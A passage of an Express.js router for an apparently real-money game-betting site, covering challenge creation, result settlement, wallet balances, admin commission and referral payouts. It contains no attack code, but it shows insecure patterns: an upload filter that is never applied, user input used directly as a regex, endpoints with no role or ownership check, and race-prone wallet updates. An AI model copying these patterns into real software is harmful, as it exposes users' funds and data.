const router = require("express").Router();
const req = require("express/lib/request");
const multer = require("multer");
const Auth = require("../Middleware/Auth");
const Game = require("../Model/Games");
const myTransaction = require("../Model/myTransaction");
const User = require("../Model/User");
const AdminEaring = require("../Model/AdminEaring");
const path = require("path");
const ReferralHis = require("../Model/referral");
const Transactions = require("../Model/transaction");
const sharp = require("sharp");
const fs = require("fs");
const axios = require('axios');

let InProcessSubmit = false;

const mongoose = require("mongoose");
const ObjectId = mongoose.Types.ObjectId;

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "public/gamedoc");
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  },
});

const fileFilter = (req, file, cd) => {
  if (
    file.mimetype === "image/jpg" ||
    file.mimetype === "image/jpeg" ||
    file.mimetype === "image/png"
  ) {
    cd(null, true);
  } else {
    cd(null, false);
  }
};

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 100000000000,
  },
});

router.post("/challange/create", Auth, async (req, res) => {
  const { Game_type, Game_Ammount } = req.body;
  try {
    const user = await User.findById(req.user.id);
    if (Game_Ammount >= 50 && Game_Ammount <= 100000) {
      if (Game_Ammount % 50 === 0) {
        if (user.Wallet_balance >= req.body.Game_Ammount) {
          let prevGame = await Game.find({
            $or: [
              {
                $and: [
                  { Status: "conflict" },
                  { Created_by: req.user.id },
                  { Creator_Status: null },
                ],
              },
              {
                $and: [
                  { Status: "conflict" },
                  { Accepetd_By: req.user.id },
                  { Acceptor_status: null },
                ],
              },
            ],
          });

          if (prevGame.length == 0) {
            prevGame = await Game.find({
              $or: [
                {
                  $and: [
                    { Status: "pending" },
                    { Created_by: req.user.id },
                    { Creator_Status: null },
                  ],
                },
                {
                  $and: [
                    { Status: "pending" },
                    { Accepetd_By: req.user.id },
                    { Acceptor_status: null },
                  ],
                },
              ],
            });
          }
          if (prevGame.length == 0) {
            prevGame = await Game.find({
              $or: [
                { $and: [{ Status: "running" }, { Created_by: req.user.id }] },
                { $and: [{ Status: "running" }, { Accepetd_By: req.user.id }] },
              ],
            });
          }

          let newGame = await Game.find({
            $or: [{ $and: [{ Status: "new" }, { Created_by: req.user.id }] }],
          });

          if (newGame.length < 2) {
            if (prevGame.length == 0) {
              let sameGame = await Game.find({
                $or: [
                  {
                    $and: [
                      { Status: "new" },
                      { Created_by: req.user.id },
                      { Game_Ammount: Game_Ammount },
                    ],
                  },
                ],
              });
              if (sameGame.length == 0) {
                const game = new Game({
                  Game_type,
                  Game_Ammount,
                  Room_code: '0',
                  Created_by: req.user.id,
                  Creator_IP: req.headers['x-forwarded-for'] || req.connection.remoteAddress // Store creator IP
                });
                game.save();
                res.send(game);
                setTimeout(
                  async (ID) => {
                    const battle = await Game.findById(ID);
                    if (battle != null && battle.Status == "new") {
                      battle.Status = "drop";
                      await battle.save();
                    }
                  },
                  24 * 60 * 60 * 1000,      
                  game._id
                );
              } else {
                res.send({ msg: "you can not create same amount challenge." });
              }
            } else {
              res.send({ msg: "you have already enrolled" });
            }
          } else {
            res.send({ msg: "You can set maximum 2 battle." });
          }
        } else {
          res.send({ msg: "Insufficient balance" });
        }
      } else {
        res.send({ msg: "Set Battle in denomination of 50" });
      }
    } else {
      res.send({
        msg: "Game amount should be Greater then 50 and less then 100000",
      });
    }
  } catch (e) {
    res.status(400).send(e);
  }
});


router.get("/challange/completed", Auth, async (req, res) => {
  try {
    const admin = await Game.find({ Status: "completed" }).countDocuments();
    res.status(200).send(admin.toString());
  } catch (e) {
    res.status(400).send(e);
  }
});

async function prevCreated(creator, acceptor) {
  const games = await Game.find({
    $and: [{ $and: [{ Status: "new" }, { Created_by: creator }] }],
  });
  if (games.length) {
    games.forEach(async (ele) => {
      ele.Status = "drop";
      await ele.save();
    });
  }
  const games1 = await Game.find({
    $and: [{ $and: [{ Status: "new" }, { Created_by: acceptor }] }],
  });
  if (games1.length) {
    games1.forEach(async (ele) => {
      ele.Status = "drop";
      await ele.save();
    });
  }
}

async function prevRequested(creator, acceptor) {
  const creatorGames = await Game.find({
    $and: [{ $and: [{ Status: "requested" }, { Accepetd_By: creator }] }],
  });
  if (creatorGames.length) {
    creatorGames.forEach(async (ele) => {
      ele.Accepetd_By = null;
      ele.Status = "new";
      ele.Acceptor_by_Creator_at = null;
      await ele.save();
    });
  }
  const creatorGames1 = await Game.find({
    $and: [{ $and: [{ Status: "requested" }, { Created_by: creator }] }],
  });
  if (creatorGames1.length) {
    creatorGames1.forEach(async (ele) => {
      ele.Status = "drop";
      await ele.save();
    });
  }
  const acceptorGames = await Game.find({
    $and: [{ $and: [{ Status: "requested" }, { Accepetd_By: acceptor }] }],
  });
  if (acceptorGames.length) {
    acceptorGames.forEach(async (ele) => {
      ele.Accepetd_By = null;
      ele.Status = "new";
      ele.Acceptor_by_Creator_at = null;
      await ele.save();
    });
  }
  const acceptorGames1 = await Game.find({
    $and: [{ $and: [{ Status: "requested" }, { Created_by: acceptor }] }],
  });
  if (acceptorGames1.length) {
    acceptorGames1.forEach(async (ele) => {
      ele.Status = "drop";
      await ele.save();
    });
  }
}

router.get("/challange/active", Auth, async (req, res) => {
  try {
    const admin = await Game.find({ Status: "new" }).countDocuments();
    res.status(200).send(admin.toString());
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/running", Auth, async (req, res) => {
  try {
    const admin = await Game.find({ Status: "running" }).countDocuments();
    res.status(200).send(admin.toString());
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/cancelled", Auth, async (req, res) => {
  try {
    const admin = await Game.find({ Status: "cancelled" }).countDocuments();
    res.status(200).send(admin.toString());
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/admin/challange/all", Auth, async (req, res) => {
  try {
    // Validate admin role
    const admin = await User.findById(req.user.id);
    if (!admin || admin.role !== 'admin') {
      return res.status(403).send({ error: "Access denied. Admin privileges required." });
    }

    // Pagination setup
    const PAGE_SIZE = parseInt(req.query._limit) || 20;
    const page = parseInt(req.query.page) || 1;
    const skip = (page - 1) * PAGE_SIZE;

    // Filtering options
    const filter = {};
    if (req.query.status) {
      filter.Status = req.query.status;
    }
    if (req.query.game_type) {
      filter.Game_type = req.query.game_type;
    }
    if (req.query.min_amount) {
      filter.Game_Ammount = { $gte: parseInt(req.query.min_amount) };
    }
    if (req.query.max_amount) {
      filter.Game_Ammount = { ...filter.Game_Ammount, $lte: parseInt(req.query.max_amount) };
    }
    if (req.query.creator_ip) {
      filter.Creator_IP = { $regex: req.query.creator_ip, $options: 'i' };
    }
    if (req.query.acceptor_ip) {
      filter.Acceptor_IP = { $regex: req.query.acceptor_ip, $options: 'i' };
    }

    // Sorting options
    const sort = {};
    if (req.query.sortBy) {
      const sortFields = req.query.sortBy.split(':');
      sort[sortFields[0]] = sortFields[1] === 'desc' ? -1 : 1;
    } else {
      sort.createdAt = -1; // Default sort by newest first
    }

    // Get total count for pagination
    const total = await Game.countDocuments(filter);

    // Main query
    const challenges = await Game.find(filter)
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .populate("action_by", "Name Phone avatar _id")
      .sort(sort)
      .limit(PAGE_SIZE)
      .skip(skip)
      .lean(); // Convert to plain JS objects

    // Format IP addresses for display (optional)
    const formattedChallenges = challenges.map(challenge => {
      return {
        ...challenge,
        Creator_IP: challenge.Creator_IP || 'N/A',
        Acceptor_IP: challenge.Acceptor_IP || 'N/A',
        // Mask IPs partially if needed (e.g., 192.168.xxx.xxx)
        maskedCreatorIP: challenge.Creator_IP 
          ? challenge.Creator_IP.replace(/\d+\.\d+$/, 'xxx.xxx') 
          : 'N/A',
        maskedAcceptorIP: challenge.Acceptor_IP 
          ? challenge.Acceptor_IP.replace(/\d+\.\d+$/, 'xxx.xxx') 
          : 'N/A'
      };
    });

    res.status(200).send({
      success: true,
      totalItems: total,
      totalPages: Math.ceil(total / PAGE_SIZE),
      currentPage: page,
      pageSize: PAGE_SIZE,
      challenges: formattedChallenges,
      filters: {
        availableStatuses: ['new', 'requested', 'running', 'pending', 'completed', 'cancelled', 'conflict', 'drop'],
        availableGameTypes: ['classic', 'quick', 'tournament'] // Update with your game types
      }
    });

  } catch (e) {
    console.error("[ADMIN] Error fetching challenges:", e);
    res.status(500).send({
      success: false,
      error: "Internal server error",
      details: process.env.NODE_ENV === 'development' ? e.message : undefined
    });
  }
});

router.get("/admin/challange/dashboard/all", Auth, async (req, res) => {
  const PAGE_SIZE = req.query._limit;
  let page = req.query.page == 0 ? 0 : parseInt(req.query.page - 1);
  try {
    const total = await Game.countDocuments({
      $or: [
        { Status: "new" },
        { Status: "running" },
        { Status: "conflict" },
        { Status: "requested" },
        { Status: "pending" },
      ],
    });
    const status = await Game.find({
      $or: [
        { Status: "new" },
        { Status: "running" },
        { Status: "conflict" },
        { Status: "requested" },
        { Status: "pending" },
      ],
    })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ createdAt: -1 })
      .limit(PAGE_SIZE)
      .skip(PAGE_SIZE * page);
    res.status(200).send({ totalPages: Math.ceil(total / PAGE_SIZE), status });
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/get_challange/user/:id", Auth, async (req, res) => {
  try {
    const status = await Game.find({
      $or: [{ Created_by: req.params.id }, { Accepetd_By: req.params.id }],
    })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 });
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/completed_challange", Auth, async (req, res) => {
  const PAGE_SIZE = req.query._limit;
  let page = req.query.page == 0 ? 0 : parseInt(req.query.page - 1);
  try {
    const total = await Game.countDocuments({ $and: [{ Status: "completed" }] });
    const status = await Game.find({ $and: [{ Status: "completed" }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 })
      .limit(PAGE_SIZE)
      .skip(PAGE_SIZE * page);
    res.status(200).send({ totalPages: Math.ceil(total / PAGE_SIZE), status });
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/conflict_challange", Auth, async (req, res) => {
  try {
    const status = await Game.find({ $and: [{ Status: "conflict" }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 });
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/cancelled_challange", Auth, async (req, res) => {
  const PAGE_SIZE = req.query._limit;
  let page = req.query.page == 0 ? 0 : parseInt(req.query.page - 1);
  try {
    const total = await Game.countDocuments({ $and: [{ Status: "cancelled" }] });
    const status = await Game.find({ $and: [{ Status: "cancelled" }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 })
      .limit(PAGE_SIZE)
      .skip(PAGE_SIZE * page);
    res.status(200).send({ totalPages: Math.ceil(total / PAGE_SIZE), status });
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/running_challange", Auth, async (req, res) => {
  try {
    const status = await Game.find({ $or: [{ Status: "running" }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 });
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/drop_challange", Auth, async (req, res) => {
  try {
    const status = await Game.find({ $or: [{ Status: "drop" }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 });
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/new_challange", Auth, async (req, res) => {
  try {
    const status = await Game.find({ $and: [{ Status: "new" }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 });
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/all", Auth, async (req, res) => {
  try {
    const status = await Game.find({
      $or: [{ Status: "new" }, { Status: "requested" }, { Status: "running" }],
    })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id");
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/some", Auth, async (req, res) => {
  try {
    const status = await Game.find({
      $or: [
        { $or: [{ Status: "conflict" }] },
        { $or: [{ Status: "running" }] },
        { $or: [{ Status: "panding" }] },
      ],
    })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id");
    res.status(200).send(status);
  } catch (e) {
    res.status(400).send(e);
  }
});

router.get("/challange/:id", Auth, async (req, res) => {
  try {
    let admin = await Game.findById(req.params.id)
      .populate("Created_by", "Name Phone avatar _id hold_balance")
      .populate("Accepetd_By", "Name Phone avatar _id hold_balance")
      .populate("Winner", "Name Phone avatar _id")
      .populate("action_by");
    res.status(200).send(admin);
  } catch (e) {
    res.status(400).send(e);
  }
});



router.patch("/challange/roomcode/:id", Auth, async (req, res) => {

  try {
    const user = req.user.id;
    const game = await Game.findById(req.params.id);
    if (game.Created_by == user && game.Status == "running") {
      const game1 = await Game.findByIdAndUpdate(
        req.params.id,
        { Room_code: req.body.Room_code },
        { new: true }
      );
      res.status(200).send(game1);
    } else {
      res.status(200).send("Sorry");
    }
  } catch (e) {
    res.status(400).send(e);
    // // console.log(e);
  }
});



router.patch("/challange/status/running/:id", Auth, async (req, res) => {
  try {
    const user = req.user.id;
    const game = await Game.findById(req.params.id);
    if (game.Created_by == user && game.Status == "requested") {
      const game1 = await Game.findByIdAndUpdate(
        req.params.id,
        { Status: "running" },
        { new: true }
      );
      const { Winner_closingbalance, Loser_closingbalance } =
        await deduct_wallet(
          game1.Accepetd_By,
          game1.Created_by,
          game1.Game_Ammount
        );
      game1.Winner_closingbalance = Winner_closingbalance;
      game1.Loser_closingbalance = Loser_closingbalance;
      game1.save();
      await prevRequested(game.Created_by, game.Accepetd_By);
      await prevCreated(game.Created_by, game.Accepetd_By);
      res.status(200).send(game1);
    } else {
      res.status(200).send("Sorry");
    }
  } catch (e) {
    res.status(400).send(e);
  }
});

router.post(
  "/challange/result/:id",
  Auth,
  upload.array("file"),
  async (req, res) => {
    try {
      const game = await Game.findById(req.params.id);
      if (game.Status != "cancelled" && game.Status != "completed") {
        const reqUser = req.user.id;
        const field =
          game.Created_by == reqUser
            ? "Creator_Status"
            : game.Accepetd_By == reqUser
            ? "Acceptor_status"
            : undefined;
        const fieldUpdatedAt =
          game.Created_by == reqUser
            ? "Creator_Status_Updated_at"
            : game.Accepetd_By == reqUser
            ? "Acceptor_status_Updated_at"
            : undefined;
        game[field] = req.body.status;
        game[fieldUpdatedAt] = Date.now();

        if (req.files) {
          const file =
            game.Created_by == reqUser
              ? "Creator_Screenshot"
              : game.Accepetd_By == reqUser
              ? "Acceptor_screenshot"
              : undefined;
          let path = "";
          req.files.forEach(function (files) {
            path = path + files.path + " , ";
          });
          path = path.substring(0, path.lastIndexOf(" , "));
          game[file] = path;
        }

        if (req.body.status == "cancelled") {
          const reason =
            game.Created_by == reqUser
              ? "Creator_Status_Reason"
              : game.Accepetd_By == reqUser
              ? "Acceptor_status_reason"
              : undefined;
          game[reason] = req.body.reason;
        }

        if (game.Creator_Status == null || game.Acceptor_status == null) {
          const updateResult = await Game.findByIdAndUpdate(req.params.id, {
            Status: "pending",
          })
            .where("Status")
            .equals("running");
          if (updateResult != null) {
            setTimeout(
              async (GameID) => {
                const game = await Game.findById(GameID);
                if (game != null && game.Status == "pending") {
                  game.Status = "conflict";
                  await game.save();
                }
              },
              300000,
              req.params.id
            );
            await game.save();
            res.status(200).send(game);
          }
        } else if (
          game.Creator_Status == "lose" &&
          game.Acceptor_status == "cancelled"
        ) {
          let updateResult = await Game.findByIdAndUpdate(req.params.id, {
            Status: "cancelled",
          })
            .where("Status")
            .equals("running");
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("pending");
          }
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("conflict");
          }
          if (updateResult != null) {
            const user1 = await User.findById(game.Accepetd_By);
            const user2 = await User.findById(game.Created_by);
            user2.Wallet_balance += game.Game_Ammount;
            user1.Wallet_balance += game.Game_Ammount;
            user2.withdrawAmount += game.creatorWithdrawDeducted;
            user1.withdrawAmount += game.acceptorWithdrawDeducted;
            user1.hold_balance -= game.Game_Ammount;
            user2.hold_balance -= game.Game_Ammount;
            await user2.save();
            await user1.save();

            game.Winner_closingbalance += game.Game_Ammount;
            game.Loser_closingbalance += game.Game_Ammount;
            await game.save();
            res.status(200).send(game);
          }
        } else if (
          game.Creator_Status == "cancelled" &&
          game.Acceptor_status == "lose"
        ) {
          let updateResult = await Game.findByIdAndUpdate(req.params.id, {
            Status: "cancelled",
          })
            .where("Status")
            .equals("running");
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("pending");
          }
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("conflict");
          }
          if (updateResult != null) {
            const user1 = await User.findById(game.Accepetd_By);
            const user2 = await User.findById(game.Created_by);
            user2.Wallet_balance += game.Game_Ammount;
            user1.Wallet_balance += game.Game_Ammount;
            user2.withdrawAmount += game.creatorWithdrawDeducted;
            user1.withdrawAmount += game.acceptorWithdrawDeducted;
            user1.hold_balance -= game.Game_Ammount;
            user2.hold_balance -= game.Game_Ammount;
            await user2.save();
            await user1.save();

            game.Winner_closingbalance += game.Game_Ammount;
            game.Loser_closingbalance += game.Game_Ammount;
            await game.save();
            res.status(200).send(game);
          }
        } else if (
          game.Creator_Status == "cancelled" &&
          game.Acceptor_status == "cancelled"
        ) {
          let updateResult = await Game.findByIdAndUpdate(req.params.id, {
            Status: "cancelled",
          })
            .where("Status")
            .equals("running");
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("pending");
          }
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("conflict");
          }
          if (updateResult != null) {
            const user1 = await User.findById(game.Accepetd_By);
            const user2 = await User.findById(game.Created_by);
            user2.Wallet_balance += game.Game_Ammount;
            user1.Wallet_balance += game.Game_Ammount;
            user2.withdrawAmount += game.creatorWithdrawDeducted;
            user1.withdrawAmount += game.acceptorWithdrawDeducted;
            user1.hold_balance -= game.Game_Ammount;
            user2.hold_balance -= game.Game_Ammount;
            await user2.save();
            await user1.save();

            game.Winner_closingbalance += game.Game_Ammount;
            game.Loser_closingbalance += game.Game_Ammount;
            await game.save();
            res.status(200).send(game);
          }
        } else if (
          game.Creator_Status == "lose" &&
          game.Acceptor_status == "lose"
        ) {
          let updateResult = await Game.findByIdAndUpdate(req.params.id, {
            Status: "cancelled",
          })
            .where("Status")
            .equals("running");
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("pending");
          }
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "cancelled",
            })
              .where("Status")
              .equals("conflict");
          }
          if (updateResult != null) {
            const user1 = await User.findById(game.Accepetd_By);
            const user2 = await User.findById(game.Created_by);
            user2.Wallet_balance += game.Game_Ammount;
            user1.Wallet_balance += game.Game_Ammount;
            user2.withdrawAmount += game.creatorWithdrawDeducted;
            user1.withdrawAmount += game.acceptorWithdrawDeducted;
            user1.hold_balance -= game.Game_Ammount;
            user2.hold_balance -= game.Game_Ammount;
            await user2.save();
            await user1.save();

            game.Winner_closingbalance += game.Game_Ammount;
            game.Loser_closingbalance += game.Game_Ammount;
            await game.save();
            res.status(200).send(game);
          }
        } else if (
          (game.Creator_Status == "winn" && game.Acceptor_status == "winn") ||
          (game.Creator_Status == "cancelled" &&
            game.Acceptor_status == "winn") ||
          (game.Creator_Status == "winn" && game.Acceptor_status == "cancelled")
        ) {
          game.Status = "conflict";
          await game.save();
          res.status(200).send(game);
        } else if (
          (game.Creator_Status == "winn" && game.Acceptor_status == "lose") ||
          (game.Creator_Status == "lose" && game.Acceptor_status == "winn")
        ) {
          let updateResult = await Game.findByIdAndUpdate(req.params.id, {
            Status: "completed",
          })
            .where("Status")
            .equals("running");
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "completed",
            })
              .where("Status")
              .equals("pending");
          }
          if (updateResult == null) {
            updateResult = await Game.findByIdAndUpdate(req.params.id, {
              Status: "completed",
            })
              .where("Status")
              .equals("conflict");
          }
          if (updateResult != null) {
            if (
              game.Creator_Status == "winn" &&
              game.Acceptor_status == "lose"
            ) {
              const { winnAmount, earnAdmin } = await adminProfit(
                game.Game_Ammount,
                game.Created_by
              );
              await update_wallet(
                game.Created_by,
                game.Accepetd_By,
                game.Game_Ammount,
                winnAmount,
                game.creatorWithdrawDeducted
              );
              await Transaction(
                game.Created_by,
                game.Accepetd_By,
                winnAmount,
                "I Win"
              );
              await Transaction(
                game.Accepetd_By,
                game.Created_by,
                game.Game_Ammount,
                "I Lose"
              );
              await adminEaring(game.Accepetd_By, earnAdmin, req.params.id);
              game.Winner = game.Created_by;
              game.winnAmount = winnAmount;
              const creator_closingbalance = game.Loser_closingbalance;
              const acceptor_closingbalance = game.Winner_closingbalance;
              game.Winner_closingbalance =
                creator_closingbalance + winnAmount + game.Game_Ammount;
              game.Loser_closingbalance = acceptor_closingbalance;
              await game.save();
              res.status(200).send(game);
            } else if (
              game.Acceptor_status == "winn" &&
              game.Creator_Status == "lose"
            ) {
              const { winnAmount, earnAdmin } = await adminProfit(
                game.Game_Ammount,
                game.Accepetd_By
              );
              await update_wallet(
                game.Accepetd_By,
                game.Created_by,
                game.Game_Ammount,
                winnAmount,
                game.acceptorWithdrawDeducted
              );
              await Transaction(
                game.Accepetd_By,
                game.Created_by,
                game.Game_Ammount,
                "I Lose"
              );
              await Transaction(
                game.Created_by,
                game.Accepetd_By,
                winnAmount,
                "I Win"
              );
              await adminEaring(game.Created_by, earnAdmin, game._id);
              game.Winner = game.Accepetd_By;
              game.winnAmount = winnAmount;
              const creator_closingbalance = game.Loser_closingbalance;
              const acceptor_closingbalance = game.Winner_closingbalance;
              game.Winner_closingbalance =
                acceptor_closingbalance + winnAmount + game.Game_Ammount;
              game.Loser_closingbalance = creator_closingbalance;
              await game.save();
              res.status(200).send(game);
            }
          }
        }
      } else {
        res.status(200).send(game);
      }
    } catch (e) {
      res.status(400).send(e);
    }
  }
);


router.post("/challange/admin/result/:id", Auth, async (req, res) => {
  try {
    if (InProcessSubmit == false) {
      InProcessSubmit = true;
      const game = await Game.findById(req.params.id);
      const reqUser = req.user.id;
      const winner = req.body.winner;
      // const { winnAmount, earnAdmin } = adminProfit(game.Game_Ammount);
      //game.Creator_Status_Updated_at = Date.now();
      //game.Acceptor_status_Updated_at = Date.now();
      //player status update
      if (game.Created_by == winner) {
        game["Creator_Status"] = "winn";
        game["Acceptor_status"] = "lose";
      } else if (game.Accepetd_By == winner) {
        game["Creator_Status"] = "lose";
        game["Acceptor_status"] = "winn";
      }
      game.Status_Update_By = reqUser;
      let updateResult = await Game.findByIdAndUpdate(req.params.id, {
        Status: "completed",
      })
        .where("Status")
        .equals("pending");
      if (updateResult == null) {
        updateResult = await Game.findByIdAndUpdate(req.params.id, {
          Status: "completed",
        })
          .where("Status")
          .equals("conflict");
      }
      if (updateResult != null) {
        if (game.Creator_Status == "winn" && game.Acceptor_status == "lose") {
          const { winnAmount, earnAdmin } = await adminProfit(
            game.Game_Ammount,
            game.Created_by
          );
          await update_wallet(
            game.Created_by,
            game.Accepetd_By,
            game.Game_Ammount,
            winnAmount,
            game.creatorWithdrawDeducted
          );
          await Transaction(
            game.Created_by,
            game.Accepetd_By,
            winnAmount,
            "I Win"
          );
          await Transaction(
            game.Accepetd_By,
            game.Created_by,
            game.Game_Ammount,
            "I Lose"
          );
          await adminEaring(game.Accepetd_By, earnAdmin, req.params.id);
          game.Winner = game.Created_by;
          game.winnAmount = winnAmount;
          const creator_closingbalance = game.Loser_closingbalance;
          const acceptor_closingbalance = game.Winner_closingbalance;
          game.Winner_closingbalance =
            creator_closingbalance + winnAmount + game.Game_Ammount;
          game.Loser_closingbalance = acceptor_closingbalance;

          game.action_by = req.user.id; //Added By team
          game.actionby_Date = Date.now(); //Added By team

          await game.save();
          InProcessSubmit = false;
          res.status(200).send(game);
        } else if (
          game.Acceptor_status == "winn" &&
          game.Creator_Status == "lose"
        ) {
          const { winnAmount, earnAdmin } = await adminProfit(
            game.Game_Ammount,
            game.Accepetd_By
          );
          await update_wallet(
            game.Accepetd_By,
            game.Created_by,
            game.Game_Ammount,
            winnAmount,
            game.acceptorWithdrawDeducted
          );
          await Transaction(
            game.Accepetd_By,
            game.Created_by,
            game.Game_Ammount,
            "I Lose"
          );
          await Transaction(
            game.Created_by,
            game.Accepetd_By,
            winnAmount,
            "I Win"
          );
          await adminEaring(game.Created_by, earnAdmin, game._id);
          game.Winner = game.Accepetd_By;
          game.winnAmount = winnAmount;
          const creator_closingbalance = game.Loser_closingbalance;
          const acceptor_closingbalance = game.Winner_closingbalance;
          game.Winner_closingbalance =
            acceptor_closingbalance + winnAmount + game.Game_Ammount;
          game.Loser_closingbalance = creator_closingbalance;

          game.action_by = req.user.id; //Added By team
          game.actionby_Date = Date.now(); //Added By team

          await game.save();
          InProcessSubmit = false;
          res.status(200).send(game);
        }
      } else {
        InProcessSubmit = false;
        res.status(400).send({ error: "invalid game run away here 😫" });
      }
    }
  } catch (e) {
    InProcessSubmit = false;
    res.status(400).send(e);
  }
});

async function update_wallet(
  winID,
  loseID,
  gameAmount,
  winnAmount,
  deductedWithdrawl
) {
  const winner = await User.findById(winID);
  const losser = await User.findById(loseID);
  winner.Wallet_balance += winnAmount + gameAmount;
  winner.withdrawAmount += winnAmount + gameAmount;

  losser.loseAmount += gameAmount;

  winner.hold_balance -= gameAmount;
  losser.hold_balance -= gameAmount;
  await losser.save();
  await winner.save();
}
async function deduct_wallet(user1_id, user2_id, gameAmount) {
  const user1 = await User.findById(user1_id);
  const user2 = await User.findById(user2_id);
  user2.Wallet_balance -= gameAmount;
  user1.Wallet_balance -= gameAmount;
  user2.save();
  user1.save();
  return {
    Winner_closingbalance: user1.Wallet_balance,
    Loser_closingbalance: user2.Wallet_balance,
  };
}

async function Transaction(user1, user2, amount, remark) {
  const transac = new myTransaction({
    User_id: user1,
    User2_id: user2,
    Amount: amount,
    Remark: remark,
  });
  await transac.save();
}

async function adminEaring(loseId, amount, GameId) {
  const admin = new AdminEaring({
    Earned_Form: loseId,
    Ammount: amount,
    Game_id: GameId,
  });

  await admin.save();
}

async function adminProfit(gameAmount, winID) {
  const winner = await User.findById(winID);
  let referralPer = 0;
  if (winner.referral) {
    referralPer = 1;
    const referralUser = await User.find({ referral_code: winner.referral });
    const referralTxn = new ReferralHis();
    referralTxn.referral_code = winner.referral;
    referralTxn.earned_from = winID;
    referralTxn.amount = gameAmount * (2 / 100);
    referralUser[0].referral_earning += gameAmount * (2 / 100);
    referralUser[0].referral_wallet += gameAmount * (2 / 100);
    referralTxn.closing_balance = referralUser[0].referral_wallet;
    await referralTxn.save();
    await referralUser[0].save();
  }
  let profit = null;
  if (gameAmount >= 50 && gameAmount <= 250)
    {
        profit = gameAmount * 10 / 100;
    }
    else if (gameAmount > 250 && gameAmount <= 500)
    {
        profit = 25;
    }
    else if (gameAmount > 500)
    {
        profit = gameAmount * 5 / 100;
    }
    winner.wonAmount += (gameAmount - profit);
    await winner.save();
    let referralAmount = gameAmount * (referralPer / 100);
  let winnAmount = gameAmount - profit;
  let earnAdmin = profit - referralAmount;
  return { winnAmount: winnAmount, earnAdmin: earnAdmin };
}

router.put("/challange/accept/:id", Auth, async (req, res) => {
  try {
    const game = await Game.findById(req.params.id);
    if (
      game.Status != "cancelled" &&
      game.Status != "completed" &&
      game.Status != "running" &&
      game.Status == "new"
    ) {
      const creatorEnrolled = await Game.find({
        $and: [
          { $and: [{ Accepetd_By: game.Created_by }, { Status: "requested" }] },
        ],
      });
      if (creatorEnrolled.length) {
        game.Status = "drop";
        await game.save();
        return res.send(game);
      }
      const user = await User.findById(req.user.id);
      if (user.Wallet_balance >= game.Game_Ammount) {
        let prevGame = await Game.find({
          $and: [
            {
              $and: [
                { Created_by: req.user.id },
                { Status: "conflict" },
                { Creator_Status: null },
              ],
            },
          ],
        });
        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
              {
                $and: [
                  { Accepetd_By: req.user.id },
                  { Status: "conflict" },
                  { Acceptor_status: null },
                ],
              },
            ],
          });
        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
